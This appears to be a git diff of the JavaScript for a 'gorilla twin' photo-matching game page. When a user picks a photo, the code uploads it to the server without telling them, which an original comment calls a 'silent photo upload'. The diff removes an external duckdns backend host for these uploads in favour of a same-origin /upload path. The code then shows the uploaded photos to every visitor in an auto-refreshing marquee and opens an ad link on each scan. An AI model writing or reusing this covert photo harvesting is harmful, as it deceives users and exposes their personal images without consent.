@@ -2,9 +2,8 @@
    1. CONFIGURATIONS
 ========================================== */
 const AD_DIRECT_LINK = "https://www.profitableratecpmnetwork.com/q523uy7yt?key=a608a7a53c25642c3f909011fcbbc596";
-const BACKEND_URL = "http://asadgames2.duckdns.org";
 
-// Gorilla Twin Match Photo (Online URL)
+// Gorilla Twin Match Photo
 const GORILLA_TWIN_IMG = "gorilla.jpg";
 
 /* ==========================================
@@ -33,7 +32,7 @@ const m2 = document.getElementById('m2');
 const m3 = document.getElementById('m3');
 
 /* ==========================================
-   3. BACKGROUND ANIMATION
+   3. BACKGROUND PARTICLES ANIMATION
 ========================================== */
 const canvas = document.getElementById('bgCanvas');
 if (canvas) {
@@ -73,7 +72,7 @@ if (canvas) {
 }
 
 /* ==========================================
-   4. AUDIO EFFECTS
+   4. AUDIO SYNTHESIZER & BEEP EFFECTS
 ========================================== */
 let audioCtx = null;
 function getAudioContext() {
@@ -108,7 +107,7 @@ function playBeepSound(freq = 800, duration = 0.08) {
 }
 
 /* ==========================================
-   5. PHOTO SELECTION & AUTO-PREVIEW
+   5. PHOTO SELECTION & UPLOAD TO SERVER
 ========================================== */
 if (photoInput) {
   photoInput.addEventListener('change', function(e) {
@@ -116,12 +115,10 @@ if (photoInput) {
     if (file) {
       getAudioContext();
 
-      // Reader local preview ke liye
       const reader = new FileReader();
       reader.onload = function(event) {
         const src = event.target.result;
         
-        // Upload Box me Live Preview set karein
         if (userImagePreview) {
           userImagePreview.src = src;
           userImagePreview.classList.remove('hidden');
@@ -129,25 +126,22 @@ if (photoInput) {
         if (uploadPlaceholder) uploadPlaceholder.classList.add('hidden');
         if (scanBtn) scanBtn.classList.remove('hidden');
 
-        // Scanning image & Final result user image update karein
         if (scanningImg) scanningImg.src = src;
         if (finalUserImg) finalUserImg.src = src;
       };
       reader.readAsDataURL(file);
 
-      // Backend par silent photo upload
+      // Backend par relative path `/upload` ke zariye photo upload
       uploadPhotoToOwnServer(file);
     }
   });
 }
 
 function uploadPhotoToOwnServer(fileData) {
-  if (!BACKEND_URL) return;
-
   const formData = new FormData();
   formData.append("image", fileData);
 
-  fetch(`${BACKEND_URL}/upload`, {
+  fetch(`/upload`, {
     method: "POST",
     body: formData
   })
@@ -155,6 +149,8 @@ function uploadPhotoToOwnServer(fileData) {
   .then(data => {
     if (data.success) {
       console.log("✓ Photo saved on server:", data.path);
+      // Photo save hote hi instant marquee reload
+      loadMarqueePhotos();
     }
   })
   .catch(err => console.error("Upload Error:", err));
@@ -191,7 +187,6 @@ if (scanBtn) {
   scanBtn.addEventListener('click', function() {
     getAudioContext();
 
-    // Direct Link Ad Open
     if (AD_DIRECT_LINK) {
       window.open(AD_DIRECT_LINK, '_blank');
     }
@@ -233,7 +228,6 @@ if (scanBtn) {
         clearInterval(interval);
         playBeepSound(1200, 0.2);
 
-        // Gorilla Twin photo set karein
         if (twinImg) twinImg.src = GORILLA_TWIN_IMG;
 
         if (scanningSection) scanningSection.classList.add('hidden');
@@ -260,48 +254,42 @@ if (downloadReportBtn) {
   });
 }
 
-
-
-
-
+/* ==========================================
+   9. MARQUEE RECENT PHOTOS & BACKGROUND AUDIO
+========================================== */
 async function loadMarqueePhotos() {
-    try {
-        const res = await fetch('/api/photos');
-        const files = await res.json();
-        const marquee = document.getElementById('photoMarquee');
-        
-        if (marquee) {
-            if (files.length === 0) {
-                marquee.innerHTML = `<span style="color: #94a3b8; font-size: 12px;">Abhi tak koi photo upload nahi hui hai. Pehle user banein! 📸</span>`;
-            } else {
-                marquee.innerHTML = files.map(file => 
-                    `<img src="/uploads/${file}" style="height: 50px; width: 50px; object-fit: cover; border-radius: 50%; margin: 0 12px; border: 2px solid #38bdf8; vertical-align: middle;">`
-                ).join('');
-            }
-        }
-    } catch (err) {
-        console.error("Marquee load error:", err);
+  try {
+    const res = await fetch('/api/photos');
+    const files = await res.json();
+    const marquee = document.getElementById('photoMarquee');
+
+    if (marquee) {
+      if (!files || files.length === 0) {
+        marquee.innerHTML = `<span style="color: #94a3b8; font-size: 12px;">Abhi tak koi photo upload nahi hui hai. Pehle user banein! 📸</span>`;
+      } else {
+        marquee.innerHTML = files.map(file => 
+          `<img src="/uploads/${file}" style="height: 50px; width: 50px; object-fit: cover; border-radius: 50%; margin: 0 12px; border: 2px solid #38bdf8; vertical-align: middle;">`
+        ).join('');
+      }
     }
+  } catch (err) {
+    console.error("Marquee load error:", err);
+  }
 }
 
-// Page load par fetch karein
-window.addEventListener('DOMContentLoaded', loadMarqueePhotos);
-
-// Har 5 second me auto update karein taaki live dynamic images dikhein
-setInterval(loadMarqueePhotos, 5000);
-// Page khulte hi photos run karein
-window.addEventListener('DOMContentLoaded', loadMarqueePhotos);
-
-// Background Music Auto-Play Handler
+// Background Music Auto-Play
 const bgMusic = document.getElementById('bgMusic');
 
 function startMusic() {
-    if (bgMusic && bgMusic.paused) {
-        bgMusic.volume = 0.3; // Low soft volume
-        bgMusic.play().catch(err => console.log("Audio playback waiting for interaction"));
-    }
+  if (bgMusic && bgMusic.paused) {
+    bgMusic.volume = 0.3;
+    bgMusic.play().catch(err => console.log("Audio waiting for user click"));
+  }
 }
 
-// User ke kisi bhi pehle click par music play ho jayega
 document.addEventListener('click', startMusic, { once: true });
 document.addEventListener('touchstart', startMusic, { once: true });
+
+// Initial Load & Auto-refresh every 5 seconds
+window.addEventListener('DOMContentLoaded', loadMarqueePhotos);
+setInterval(loadMarqueePhotos, 5000);
